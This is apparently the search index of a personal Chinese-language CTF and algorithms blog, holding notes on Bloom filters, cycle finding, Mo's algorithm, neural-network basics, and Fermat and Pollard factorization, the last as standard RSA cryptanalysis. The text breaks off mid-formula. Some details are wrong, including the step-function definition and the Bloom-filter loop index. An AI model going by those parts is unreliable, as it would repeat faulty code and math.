{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u985e\u5225 \u6587\u7ae0 \u8cc7\u8a0a\u5b89\u5168 Ethereum \u5de5\u5177\u7bc7 \u8cc7\u8a0a\u5b89\u5168 Ethereum \u57fa\u790e\u7bc7 \u8cc7\u8a0a\u5b89\u5168 [OJ] Security Innovation Blockchain CTF \u8cc7\u8a0a\u5b89\u5168 [2019] TSG CTF - OPQRX \u8cc7\u8a0a\u5b89\u5168 [2019] Teaser Confidence Quals - p4fmt \u8cc7\u8a0a\u5b89\u5168 Debug Kernel \u8cc7\u8a0a\u5b89\u5168 Compile Kernel \u6f14\u7b97\u6cd5 \u83ab\u968a\u7b97\u6cd5 \u8cc7\u8a0a\u5b89\u5168 \u96b1\u85cf\u7a0b\u5e8f\u6280\u5de7 (rootkit) \u8cc7\u8a0a\u5b89\u5168 \u5f8c\u9580\u6280\u5de7","title":"\u6700\u65b0\u6587\u7ae0"},{"location":"about/","text":"\u95dc\u65bc\u6211 ( About ) CTF TEAM : BAMBOOFOX CTF SKILL : CRYPTO PWN \u8208\u8da3 : \u770b\u96fb\u5f71\u5f71\u96c6\u52d5\u6f2b, \u5f48\u92fc\u7434 \u6b61\u8fce\u62cd\u6253\u9935\u98df XD \u806f\u7d61\u6211 ( Contact ) # email base64 -d <<< amVmZnJleTY5MTBAZ21haWwuY29t # facebook base64 -d <<< aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAwMTI2OTIxMTk2Mw== # instagram base64 -d <<< aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9vYWxpZW5vCg==","title":"\u500b\u4eba\u8cc7\u6599"},{"location":"about/#about","text":"CTF TEAM : BAMBOOFOX CTF SKILL : CRYPTO PWN \u8208\u8da3 : \u770b\u96fb\u5f71\u5f71\u96c6\u52d5\u6f2b, \u5f48\u92fc\u7434 \u6b61\u8fce\u62cd\u6253\u9935\u98df XD","title":"\u95dc\u65bc\u6211 ( About )"},{"location":"about/#contact","text":"# email base64 -d <<< amVmZnJleTY5MTBAZ21haWwuY29t # facebook base64 -d <<< aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAwMTI2OTIxMTk2Mw== # instagram base64 -d <<< aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9vYWxpZW5vCg==","title":"\u806f\u7d61\u6211 ( Contact )"},{"location":"algorithm/bloom-filter/","text":"Bloom Filter \u7528\u4f86\u5feb\u901f\u641c\u5c0b\u8cc7\u6599\u662f\u5426\u5b58\u5728\u65bc\u8cc7\u6599\u5eab \u6211\u5011\u7684\u8cc7\u6599\u5eab\u662f\u4e00\u500b 2^m 2^m \u5927\u5c0f\u7684\u9663\u5217 db = [ False ] * ( 2 ** m ) \u52a0\u8cc7\u6599\u9032\u8cc7\u6599\u5eab \u6211\u5011\u6709 k k \u500b hash function \u7684\u8f38\u51fa\u90fd\u662f\u4e00\u500b m m bits \u7684\u6578 ( < 2^m < 2^m ) \u628a\u8cc7\u6599 x x \u52a0\u9032\u8cc7\u6599\u5eab\u5c31\u662f\u7b49\u65bc\uff0c\u5c07 x x \u7684\u5404\u500b\u96dc\u6e4a\u503c\u7684\u4f4d\u7f6e\u8a2d\u6210 True for i in range ( k ): db [ hash [ k ]( x )] = True \u67e5\u8a62\u8cc7\u6599\u662f\u5426\u5728\u8cc7\u6599\u5eab\u88e1 \u67e5\u8a62\u8cc7\u6599 x x \u662f\u5426\u5728\u8cc7\u6599\u5eab\u88e1 if all ([ db [ hash [ k ]( x )] for i in range ( k )]): # \u8cc7\u6599 x \u53ef\u80fd\u5728\u8cc7\u6599\u5eab\u88e1 else : # \u8cc7\u6599 x \u4e00\u5b9a\u4e0d\u5728\u8cc7\u6599\u5eab\u88e1 \u76f8\u95dc\u8cc7\u6599 http://www.evanlin.com/BloomFilter/ http://bryanpendleton.blogspot.com/2011/12/three-papers-on-bloom-filters.html","title":"Bloom Filter"},{"location":"algorithm/bloom-filter/#bloom-filter","text":"\u7528\u4f86\u5feb\u901f\u641c\u5c0b\u8cc7\u6599\u662f\u5426\u5b58\u5728\u65bc\u8cc7\u6599\u5eab \u6211\u5011\u7684\u8cc7\u6599\u5eab\u662f\u4e00\u500b 2^m 2^m \u5927\u5c0f\u7684\u9663\u5217 db = [ False ] * ( 2 ** m )","title":"Bloom Filter"},{"location":"algorithm/bloom-filter/#_1","text":"\u6211\u5011\u6709 k k \u500b hash function \u7684\u8f38\u51fa\u90fd\u662f\u4e00\u500b m m bits \u7684\u6578 ( < 2^m < 2^m ) \u628a\u8cc7\u6599 x x \u52a0\u9032\u8cc7\u6599\u5eab\u5c31\u662f\u7b49\u65bc\uff0c\u5c07 x x \u7684\u5404\u500b\u96dc\u6e4a\u503c\u7684\u4f4d\u7f6e\u8a2d\u6210 True for i in range ( k ): db [ hash [ k ]( x )] = True","title":"\u52a0\u8cc7\u6599\u9032\u8cc7\u6599\u5eab"},{"location":"algorithm/bloom-filter/#_2","text":"\u67e5\u8a62\u8cc7\u6599 x x \u662f\u5426\u5728\u8cc7\u6599\u5eab\u88e1 if all ([ db [ hash [ k ]( x )] for i in range ( k )]): # \u8cc7\u6599 x \u53ef\u80fd\u5728\u8cc7\u6599\u5eab\u88e1 else : # \u8cc7\u6599 x \u4e00\u5b9a\u4e0d\u5728\u8cc7\u6599\u5eab\u88e1","title":"\u67e5\u8a62\u8cc7\u6599\u662f\u5426\u5728\u8cc7\u6599\u5eab\u88e1"},{"location":"algorithm/bloom-filter/#_3","text":"http://www.evanlin.com/BloomFilter/ http://bryanpendleton.blogspot.com/2011/12/three-papers-on-bloom-filters.html","title":"\u76f8\u95dc\u8cc7\u6599"},{"location":"algorithm/floyd-cycle-finding/","text":"Floyd's Cycle-Finding Algorithm \u4e00\u822c\u4f86\u8aaa\uff0c\u8981\u627e cycle \u5c31\u662f\u8981\u628a\u6240\u6709\u6383\u904e\u53bb\u7684 x_i x_i \u8a18\u8d77\u4f86 \u76f4\u5230\u627e\u5230\u4e00\u500b x_i x_i \u548c x_0 x_0 ~ x_{i-1} x_{i-1} \u6709\u91cd\u8907 \u4f46\u662f\u9019\u6a23\u5f88\u6d6a\u8cbb\u7a7a\u9593 Floyd's Cycle-Finding Algorithm \u5c31\u662f\u53ea\u7528\u5132\u5b58\u5169\u500b\u6578 tortoise \u548c hare tortoise \u5f88\u6162\uff0chare \u5f88\u5feb \u4e5f\u5c31\u662f tortoise \u6bcf\u6b21\u8d70\u4e00\u6b65\uff0chare \u5247\u8d70\u5169\u6b65 \u90a3\u9ebc hare \u6703\u5f9e cycle \u7684\u5f8c\u9762\u8ffd\u4e0a tortoise \u8ffd\u4e0a\u4e4b\u5f8c\u4e5f\u5c31\u662f\u8aaa x_i = x_{2i} x_i = x_{2i} \u90a3 2i - i = i 2i - i = i \u6703\u662f cycle \u7684\u500d\u6578 \u63a5\u4e0b\u4f86\u6211\u5011\u5c31\u5c07 tortoise reset \u5230\u539f\u9ede\uff0chare \u7559\u5728\u539f\u5730 \u7136\u5f8c tortoise \u548c hare \u90fd\u6bcf\u6b21\u8d70\u4e00\u6b65 \u56e0\u70ba\u73fe\u5728\u7684 tortoise \u548c hare \u7684\u8ddd\u96e2\u56fa\u5b9a\u662f 2i 2i \u4e5f\u662f cycle \u7684\u500d\u6578 \u6240\u4ee5\u8aaa\u7576 tortoise \u8d70\u5230 cycle \u7684\u8d77\u9ede\u6642\uff0chare \u6703\u5728\u8ddd\u96e2\u4ed6\u6578\u500d cyle \u7684\u8ddd\u96e2\uff0c\u4e5f\u5c31\u662f tortoise \u6703\u7b49\u65bc hare \u6211\u5011\u5c31\u627e\u5230 cycle \u7684\u8d77\u9ede\u4e86","title":"Floyd's Cycle-Finding Algorithm"},{"location":"algorithm/floyd-cycle-finding/#floyds-cycle-finding-algorithm","text":"\u4e00\u822c\u4f86\u8aaa\uff0c\u8981\u627e cycle \u5c31\u662f\u8981\u628a\u6240\u6709\u6383\u904e\u53bb\u7684 x_i x_i \u8a18\u8d77\u4f86 \u76f4\u5230\u627e\u5230\u4e00\u500b x_i x_i \u548c x_0 x_0 ~ x_{i-1} x_{i-1} \u6709\u91cd\u8907 \u4f46\u662f\u9019\u6a23\u5f88\u6d6a\u8cbb\u7a7a\u9593 Floyd's Cycle-Finding Algorithm \u5c31\u662f\u53ea\u7528\u5132\u5b58\u5169\u500b\u6578 tortoise \u548c hare tortoise \u5f88\u6162\uff0chare \u5f88\u5feb \u4e5f\u5c31\u662f tortoise \u6bcf\u6b21\u8d70\u4e00\u6b65\uff0chare \u5247\u8d70\u5169\u6b65 \u90a3\u9ebc hare \u6703\u5f9e cycle \u7684\u5f8c\u9762\u8ffd\u4e0a tortoise \u8ffd\u4e0a\u4e4b\u5f8c\u4e5f\u5c31\u662f\u8aaa x_i = x_{2i} x_i = x_{2i} \u90a3 2i - i = i 2i - i = i \u6703\u662f cycle \u7684\u500d\u6578 \u63a5\u4e0b\u4f86\u6211\u5011\u5c31\u5c07 tortoise reset \u5230\u539f\u9ede\uff0chare \u7559\u5728\u539f\u5730 \u7136\u5f8c tortoise \u548c hare \u90fd\u6bcf\u6b21\u8d70\u4e00\u6b65 \u56e0\u70ba\u73fe\u5728\u7684 tortoise \u548c hare \u7684\u8ddd\u96e2\u56fa\u5b9a\u662f 2i 2i \u4e5f\u662f cycle \u7684\u500d\u6578 \u6240\u4ee5\u8aaa\u7576 tortoise \u8d70\u5230 cycle \u7684\u8d77\u9ede\u6642\uff0chare \u6703\u5728\u8ddd\u96e2\u4ed6\u6578\u500d cyle \u7684\u8ddd\u96e2\uff0c\u4e5f\u5c31\u662f tortoise \u6703\u7b49\u65bc hare \u6211\u5011\u5c31\u627e\u5230 cycle \u7684\u8d77\u9ede\u4e86","title":"Floyd's Cycle-Finding Algorithm"},{"location":"algorithm/mo/","text":"\u554f\u984c\u6558\u8ff0 \u7d66\u4e00\u5927\u5c0f N N \u7684\u5e8f\u5217\uff0c\u56de\u7b54 M M \u6b21\u67e5\u8a62\uff0c\u6bcf\u6b21\u67e5\u8a62\u90fd\u662f\u554f\u4e00\u500b\u5340\u9593 [L, R] [L, R] \u7684\u7b54\u6848\uff08\u6bd4\u5982\u5340\u9593\u773e\u6578\uff09 \u689d\u4ef6 \u53ef\u4ee5\u5728\u5f88\u77ed\u7684\u6642\u9593\u5167\u7531 [L, R] [L, R] \u5f97\u5230 [L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R] [L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R] \u7684\u7b54\u6848 \u53ef\u4ee5\u96e2\u7dda\u904b\u7b97\uff08\u4e5f\u5c31\u662f\u53ef\u4ee5\u628a\u8f38\u5165\u901a\u901a\u5403\u9032\u4f86\u518d\u8f38\u51fa\uff09 \u7b97\u6cd5 \u5c07 M M \u6b21\u67e5\u8a62\u6839\u64da L L \u7684\u5927\u5c0f\u5206\u70ba \\sqrt{N} \\sqrt{N} \u584a \u4e5f\u5c31\u662f\u6bcf\u584a\u88e1\u9762\u7684 L L \u6700\u591a\u53ea\u6703\u5dee\u8ddd \\sqrt{N} \\sqrt{N} \u6bcf\u584a\u88e1\u9762\u7684 R R \u518d\u7531\u5c0f\u5230\u5927\u6392\u5e8f \u6309\u7167\u6392\u597d\u7684\u9806\u5e8f\u7b97\u7b54\u6848\uff0c\u7f3a\u5c11\u4ec0\u9ebc\u5c31\u4e00\u500b\u500b\u52a0\u9032\u4f86\uff0c\u591a\u4e86\u4ec0\u9ebc\u5c31\u4e00\u500b\u500b\u4e1f\u6389 add \u51fd\u5f0f\u5c31\u662f\u5be6\u4f5c\u628a\u4e00\u500b\u6578\u52a0\u9032\u76ee\u524d\u7684\u5340\u9593 sub \u51fd\u5f0f\u5c31\u662f\u5be6\u4f5c\u628a\u4e00\u500b\u6578\u5f9e\u76ee\u524d\u7684\u5340\u9593\u4e1f\u6389 struct Q { int l , r , b , i ; bool operator < ( const Q & q ) { return b == q . b ? ( r < q . r ) : b < q . b ; } } q [ MAXM ]; int block = ceil ( sqrt ( MAXN )); for ( int i = 0 ; i < m ; i ++ ) { int l , r ; cin >> l >> r ; q [ i ]. l = l ; q [ i ]. r = r ; q [ i ]. b = q [ i ]. l / block ; q [ i ]. i = i ; } sort ( q , q + m ); for ( int i = 0 , L = 0 , R = - 1 ; i < m ; i ++ ) { while ( R < q [ i ]. r ) add ( a [ ++ R ]); while ( q [ i ]. l < L ) add ( a [ -- L ]); while ( q [ i ]. r < R ) sub ( a [ R -- ]); while ( L < q [ i ]. l ) sub ( a [ L ++ ]); ans [ q [ i ]. i ] = cur ; } \u6642\u9593\u8907\u96dc\u5ea6 O(N^{1.5}) O(N^{1.5}) \u5947\u5076\u512a\u5316 \u7b2c\u4e00\u584a\u7684 R R \u5f9e\u5c0f\u5230\u5927 \u7b2c\u4e8c\u584a\u5f9e R R \u5927\u5230\u5c0f \u7b2c\u4e09\u584a\u5f9e R R \u5c0f\u5230\u5927 \u5728\u5f9e\u7b2c\u4e00\u584a\u8981\u5230\u7b2c\u4e8c\u584a\u7684\u6642\u5019\uff0c R R \u90fd\u662f\u5927\u7684 \u5728\u5f9e\u7b2c\u4e8c\u584a\u8981\u5230\u7b2c\u4e09\u584a\u7684\u6642\u5019\uff0c R R \u90fd\u662f\u5c0f\u7684 bool operator < ( const Q & q ) { return b == q . b ? ( r < q . r ) ^ ( b % 2 ) : b < q . b ; } \u984c\u76ee Codeforces 86D - Powerful array http://sunmoon-template.blogspot.com/2015/08/mos-algorithm.html \u21a9 https://zhuanlan.zhihu.com/p/25017840 \u21a9 https://oi-wiki.org/misc/mo-algo/ \u21a9","title":"\u83ab\u968a\u7b97\u6cd5"},{"location":"algorithm/mo/#_1","text":"\u7d66\u4e00\u5927\u5c0f N N \u7684\u5e8f\u5217\uff0c\u56de\u7b54 M M \u6b21\u67e5\u8a62\uff0c\u6bcf\u6b21\u67e5\u8a62\u90fd\u662f\u554f\u4e00\u500b\u5340\u9593 [L, R] [L, R] \u7684\u7b54\u6848\uff08\u6bd4\u5982\u5340\u9593\u773e\u6578\uff09","title":"\u554f\u984c\u6558\u8ff0"},{"location":"algorithm/mo/#_2","text":"\u53ef\u4ee5\u5728\u5f88\u77ed\u7684\u6642\u9593\u5167\u7531 [L, R] [L, R] \u5f97\u5230 [L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R] [L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R] \u7684\u7b54\u6848 \u53ef\u4ee5\u96e2\u7dda\u904b\u7b97\uff08\u4e5f\u5c31\u662f\u53ef\u4ee5\u628a\u8f38\u5165\u901a\u901a\u5403\u9032\u4f86\u518d\u8f38\u51fa\uff09","title":"\u689d\u4ef6"},{"location":"algorithm/mo/#_3","text":"\u5c07 M M \u6b21\u67e5\u8a62\u6839\u64da L L \u7684\u5927\u5c0f\u5206\u70ba \\sqrt{N} \\sqrt{N} \u584a \u4e5f\u5c31\u662f\u6bcf\u584a\u88e1\u9762\u7684 L L \u6700\u591a\u53ea\u6703\u5dee\u8ddd \\sqrt{N} \\sqrt{N} \u6bcf\u584a\u88e1\u9762\u7684 R R \u518d\u7531\u5c0f\u5230\u5927\u6392\u5e8f \u6309\u7167\u6392\u597d\u7684\u9806\u5e8f\u7b97\u7b54\u6848\uff0c\u7f3a\u5c11\u4ec0\u9ebc\u5c31\u4e00\u500b\u500b\u52a0\u9032\u4f86\uff0c\u591a\u4e86\u4ec0\u9ebc\u5c31\u4e00\u500b\u500b\u4e1f\u6389 add \u51fd\u5f0f\u5c31\u662f\u5be6\u4f5c\u628a\u4e00\u500b\u6578\u52a0\u9032\u76ee\u524d\u7684\u5340\u9593 sub \u51fd\u5f0f\u5c31\u662f\u5be6\u4f5c\u628a\u4e00\u500b\u6578\u5f9e\u76ee\u524d\u7684\u5340\u9593\u4e1f\u6389 struct Q { int l , r , b , i ; bool operator < ( const Q & q ) { return b == q . b ? ( r < q . r ) : b < q . b ; } } q [ MAXM ]; int block = ceil ( sqrt ( MAXN )); for ( int i = 0 ; i < m ; i ++ ) { int l , r ; cin >> l >> r ; q [ i ]. l = l ; q [ i ]. r = r ; q [ i ]. b = q [ i ]. l / block ; q [ i ]. i = i ; } sort ( q , q + m ); for ( int i = 0 , L = 0 , R = - 1 ; i < m ; i ++ ) { while ( R < q [ i ]. r ) add ( a [ ++ R ]); while ( q [ i ]. l < L ) add ( a [ -- L ]); while ( q [ i ]. r < R ) sub ( a [ R -- ]); while ( L < q [ i ]. l ) sub ( a [ L ++ ]); ans [ q [ i ]. i ] = cur ; }","title":"\u7b97\u6cd5"},{"location":"algorithm/mo/#_4","text":"O(N^{1.5}) O(N^{1.5})","title":"\u6642\u9593\u8907\u96dc\u5ea6"},{"location":"algorithm/mo/#_5","text":"\u7b2c\u4e00\u584a\u7684 R R \u5f9e\u5c0f\u5230\u5927 \u7b2c\u4e8c\u584a\u5f9e R R \u5927\u5230\u5c0f \u7b2c\u4e09\u584a\u5f9e R R \u5c0f\u5230\u5927 \u5728\u5f9e\u7b2c\u4e00\u584a\u8981\u5230\u7b2c\u4e8c\u584a\u7684\u6642\u5019\uff0c R R \u90fd\u662f\u5927\u7684 \u5728\u5f9e\u7b2c\u4e8c\u584a\u8981\u5230\u7b2c\u4e09\u584a\u7684\u6642\u5019\uff0c R R \u90fd\u662f\u5c0f\u7684 bool operator < ( const Q & q ) { return b == q . b ? ( r < q . r ) ^ ( b % 2 ) : b < q . b ; }","title":"\u5947\u5076\u512a\u5316"},{"location":"algorithm/mo/#_6","text":"Codeforces 86D - Powerful array http://sunmoon-template.blogspot.com/2015/08/mos-algorithm.html \u21a9 https://zhuanlan.zhihu.com/p/25017840 \u21a9 https://oi-wiki.org/misc/mo-algo/ \u21a9","title":"\u984c\u76ee"},{"location":"algorithm/resources/","text":"\u76f8\u95dc\u8cc7\u6e90 \u6f14\u7b97\u6cd5\u7b46\u8a18","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/resources/#_1","text":"\u6f14\u7b97\u6cd5\u7b46\u8a18","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/ai/neural-network/","text":"Neural Network \u4e00\u500b neuron \u9577\u9019\u6a23 z = \\mathbf{w} \\cdot \\mathbf{x} + b z = \\mathbf{w} \\cdot \\mathbf{x} + b output = z \u4ee3\u5165 activation function Activation functions \\text{step function} = \\left\\{\\begin{matrix} 0 \\ \\text{ if } z \\le 0 \\\\ 1 \\ \\text{ if } z < 0 \\end{matrix}\\right. \\text{step function} = \\left\\{\\begin{matrix} 0 \\ \\text{ if } z \\le 0 \\\\ 1 \\ \\text{ if } z < 0 \\end{matrix}\\right. \\text{sigmoid function} = {\\Large \\frac{1}{1+e^{-z}}} \\text{sigmoid function} = {\\Large \\frac{1}{1+e^{-z}}} Gradient Descent n : numbers of training input y : desired output a : output of input x Let \\mathbf{h} = [\\mathbf{w} \\mathbf{h} = [\\mathbf{w} , \\mathbf{b}] \\mathbf{b}] Cost function : \\begin{eqnarray} C(\\mathbf{h}) \\equiv \\frac{1}{n} \\sum_x \\frac{1}{2} \\| \\mathbf{y} - \\mathbf{a} \\|^2 \\end{eqnarray} \\begin{eqnarray} C(\\mathbf{h}) \\equiv \\frac{1}{n} \\sum_x \\frac{1}{2} \\| \\mathbf{y} - \\mathbf{a} \\|^2 \\end{eqnarray} ( \\frac{1}{2} \\frac{1}{2} \u662f\u70ba\u4e86\u4e4b\u5f8c\u5fae\u5206\u65b9\u4fbf ) \u5f9e\u73fe\u5728\u7684\u4f4d\u7f6e\u770b\u51fa\u53bb\u7684\u659c\u7387 \\nabla C = ({\\large \\frac{\\partial C}{\\partial h_0}, \\frac{\\partial C}{\\partial h_1}, \\cdots}) \\nabla C = ({\\large \\frac{\\partial C}{\\partial h_0}, \\frac{\\partial C}{\\partial h_1}, \\cdots}) \u7528 -\\eta \\nabla C -\\eta \\nabla C \u66f4\u65b0 \\mathbf{h} \\mathbf{h} \uff0c\u53ef\u4ee5\u8b93\u6211\u5011\u7684 C C \u5f80\u4f4e\u8655\u8dd1 ( \\eta \\eta \u662f learning rate ) h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} Learning Rate Learning Rate \u5f88\u5927 : \u5b78\u7fd2\u5feb\u4f46\u5bb9\u6613\u9707\u76ea Learning Rate \u5f88\u5c0f : \u5b78\u7fd2\u6162\u4f46\u6bd4\u8f03\u7a69\u5b9a Momentum h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} + \\underset{momentum}{\\underbrace{\\alpha(h_k(t) - h_k(t-1))}} h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} + \\underset{momentum}{\\underbrace{\\alpha(h_k(t) - h_k(t-1))}} Momentum \u53ef\u4ee5\u52a0\u901f\u4e26\u7a69\u5b9a\u5b78\u7fd2\u66f2\u7dda \u76f8\u95dc\u8cc7\u6e90 http://neuralnetworksanddeeplearning.com/ http://darren1231.pixnet.net/blog/post/338810666-\u985e\u795e\u7d93\u7db2\u8def(backpropagation)-\u7b46\u8a18","title":"Neural Network"},{"location":"algorithm/ai/neural-network/#neural-network","text":"\u4e00\u500b neuron \u9577\u9019\u6a23 z = \\mathbf{w} \\cdot \\mathbf{x} + b z = \\mathbf{w} \\cdot \\mathbf{x} + b output = z \u4ee3\u5165 activation function","title":"Neural Network"},{"location":"algorithm/ai/neural-network/#activation-functions","text":"\\text{step function} = \\left\\{\\begin{matrix} 0 \\ \\text{ if } z \\le 0 \\\\ 1 \\ \\text{ if } z < 0 \\end{matrix}\\right. \\text{step function} = \\left\\{\\begin{matrix} 0 \\ \\text{ if } z \\le 0 \\\\ 1 \\ \\text{ if } z < 0 \\end{matrix}\\right. \\text{sigmoid function} = {\\Large \\frac{1}{1+e^{-z}}} \\text{sigmoid function} = {\\Large \\frac{1}{1+e^{-z}}}","title":"Activation functions"},{"location":"algorithm/ai/neural-network/#gradient-descent","text":"n : numbers of training input y : desired output a : output of input x Let \\mathbf{h} = [\\mathbf{w} \\mathbf{h} = [\\mathbf{w} , \\mathbf{b}] \\mathbf{b}] Cost function : \\begin{eqnarray} C(\\mathbf{h}) \\equiv \\frac{1}{n} \\sum_x \\frac{1}{2} \\| \\mathbf{y} - \\mathbf{a} \\|^2 \\end{eqnarray} \\begin{eqnarray} C(\\mathbf{h}) \\equiv \\frac{1}{n} \\sum_x \\frac{1}{2} \\| \\mathbf{y} - \\mathbf{a} \\|^2 \\end{eqnarray} ( \\frac{1}{2} \\frac{1}{2} \u662f\u70ba\u4e86\u4e4b\u5f8c\u5fae\u5206\u65b9\u4fbf ) \u5f9e\u73fe\u5728\u7684\u4f4d\u7f6e\u770b\u51fa\u53bb\u7684\u659c\u7387 \\nabla C = ({\\large \\frac{\\partial C}{\\partial h_0}, \\frac{\\partial C}{\\partial h_1}, \\cdots}) \\nabla C = ({\\large \\frac{\\partial C}{\\partial h_0}, \\frac{\\partial C}{\\partial h_1}, \\cdots}) \u7528 -\\eta \\nabla C -\\eta \\nabla C \u66f4\u65b0 \\mathbf{h} \\mathbf{h} \uff0c\u53ef\u4ee5\u8b93\u6211\u5011\u7684 C C \u5f80\u4f4e\u8655\u8dd1 ( \\eta \\eta \u662f learning rate ) h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k}","title":"Gradient Descent"},{"location":"algorithm/ai/neural-network/#learning-rate","text":"Learning Rate \u5f88\u5927 : \u5b78\u7fd2\u5feb\u4f46\u5bb9\u6613\u9707\u76ea Learning Rate \u5f88\u5c0f : \u5b78\u7fd2\u6162\u4f46\u6bd4\u8f03\u7a69\u5b9a","title":"Learning Rate"},{"location":"algorithm/ai/neural-network/#momentum","text":"h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} + \\underset{momentum}{\\underbrace{\\alpha(h_k(t) - h_k(t-1))}} h_k(t+1) = h_k(t) -\\eta \\frac{\\partial C}{\\partial h_k} + \\underset{momentum}{\\underbrace{\\alpha(h_k(t) - h_k(t-1))}} Momentum \u53ef\u4ee5\u52a0\u901f\u4e26\u7a69\u5b9a\u5b78\u7fd2\u66f2\u7dda","title":"Momentum"},{"location":"algorithm/ai/neural-network/#_1","text":"http://neuralnetworksanddeeplearning.com/ http://darren1231.pixnet.net/blog/post/338810666-\u985e\u795e\u7d93\u7db2\u8def(backpropagation)-\u7b46\u8a18","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/ai/resources/","text":"\u76f8\u95dc\u8cc7\u6e90 https://www.redblobgames.com/","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/ai/resources/#_1","text":"https://www.redblobgames.com/","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/ai/svm/","text":"Support Vector Machines \u76f8\u95dc\u8cc7\u6e90 https://medium.com/@yehjames/\u8cc7\u6599\u5206\u6790-\u6a5f\u5668\u5b78\u7fd2-\u7b2c3-4\u8b1b-\u652f\u63f4\u5411\u91cf\u6a5f-support-vector-machine-\u4ecb\u7d39-9c6c6925856b https://zhuanlan.zhihu.com/p/22400898","title":"Support Vector Machines"},{"location":"algorithm/ai/svm/#support-vector-machines","text":"","title":"Support Vector Machines"},{"location":"algorithm/ai/svm/#_1","text":"https://medium.com/@yehjames/\u8cc7\u6599\u5206\u6790-\u6a5f\u5668\u5b78\u7fd2-\u7b2c3-4\u8b1b-\u652f\u63f4\u5411\u91cf\u6a5f-support-vector-machine-\u4ecb\u7d39-9c6c6925856b https://zhuanlan.zhihu.com/p/22400898","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/factoring/fermat/","text":"Fermat's Factorization Method \u6709\u4e00\u500b\u5947\u5408\u6578 n n \uff0c\u662f\u5169\u500b\u5947\u8cea\u6578\u7684\u4e58\u7a4d n = pq n = pq \u4ee4 a = \\frac{p + q}{2}, b = \\frac{p - q}{2} a = \\frac{p + q}{2}, b = \\frac{p - q}{2} \u90a3\u9ebc n = (a + b)(a - b) = a^2 - b^2 n = (a + b)(a - b) = a^2 - b^2 \u4f46\u662f\u4eca\u5929\u6211\u5011\u4e0d\u77e5\u9053 p, q p, q \uff0c\u800c\u6211\u5011\u60f3\u8981\u5206\u89e3 n n \u90a3\u6211\u5011\u5c31\u731c a = \\lceil \\sqrt{n} \\rceil a = \\lceil \\sqrt{n} \\rceil \uff0c\u6e2c\u8a66 a^2 - n a^2 - n \u662f\u4e0d\u662f\u5b8c\u5168\u5e73\u65b9\u6578 \u731c\u5230\u7684\u8a71\u53ef\u4ee5\u5f9e a, b a, b \u53cd\u63a8\u56de p, q p, q \u6c92\u731c\u5230\u5c31\u628a a a \u52a0\u4e00\u7e7c\u7e8c\u731c \u4f7f\u7528\u689d\u4ef6 |p-q| |p-q| \u5f88\u5c0f \u7a0b\u5f0f\u78bc ( python ) import math import gmpy2 ceil = math . ceil sqrt = math . sqrt def fermat ( n ): a = ceil ( sqrt ( n )) b2 = a * a - n while not gmpy2 . iroot ( b2 , 2 )[ 1 ]: a = a + 1 b2 = a * a - n b = sqrt ( b2 ) return [ a + b , a - b ]","title":"Fermat's Factorization Algorithm"},{"location":"algorithm/factoring/fermat/#fermats-factorization-method","text":"\u6709\u4e00\u500b\u5947\u5408\u6578 n n \uff0c\u662f\u5169\u500b\u5947\u8cea\u6578\u7684\u4e58\u7a4d n = pq n = pq \u4ee4 a = \\frac{p + q}{2}, b = \\frac{p - q}{2} a = \\frac{p + q}{2}, b = \\frac{p - q}{2} \u90a3\u9ebc n = (a + b)(a - b) = a^2 - b^2 n = (a + b)(a - b) = a^2 - b^2 \u4f46\u662f\u4eca\u5929\u6211\u5011\u4e0d\u77e5\u9053 p, q p, q \uff0c\u800c\u6211\u5011\u60f3\u8981\u5206\u89e3 n n \u90a3\u6211\u5011\u5c31\u731c a = \\lceil \\sqrt{n} \\rceil a = \\lceil \\sqrt{n} \\rceil \uff0c\u6e2c\u8a66 a^2 - n a^2 - n \u662f\u4e0d\u662f\u5b8c\u5168\u5e73\u65b9\u6578 \u731c\u5230\u7684\u8a71\u53ef\u4ee5\u5f9e a, b a, b \u53cd\u63a8\u56de p, q p, q \u6c92\u731c\u5230\u5c31\u628a a a \u52a0\u4e00\u7e7c\u7e8c\u731c","title":"Fermat's Factorization Method"},{"location":"algorithm/factoring/fermat/#_1","text":"|p-q| |p-q| \u5f88\u5c0f","title":"\u4f7f\u7528\u689d\u4ef6"},{"location":"algorithm/factoring/fermat/#python","text":"import math import gmpy2 ceil = math . ceil sqrt = math . sqrt def fermat ( n ): a = ceil ( sqrt ( n )) b2 = a * a - n while not gmpy2 . iroot ( b2 , 2 )[ 1 ]: a = a + 1 b2 = a * a - n b = sqrt ( b2 ) return [ a + b , a - b ]","title":"\u7a0b\u5f0f\u78bc ( python )"},{"location":"algorithm/factoring/pollard/","text":"Pollard's p - 1 Algorithm \u6709\u4e00\u500b\u5408\u6578 n n \u6709\u4e00\u500b\u8cea\u56e0\u6578 p p \u6839\u64da\u8cbb\u99ac\u5c0f\u5b9a\u7406\uff0c\u7576 a a \u4e0d\u662f p p \u7684\u500d\u6578 a^{p-1} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} - 1 \\equiv 0 \\pmod{p} a^{p-1} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} \\equiv 1 \\pmod{p} 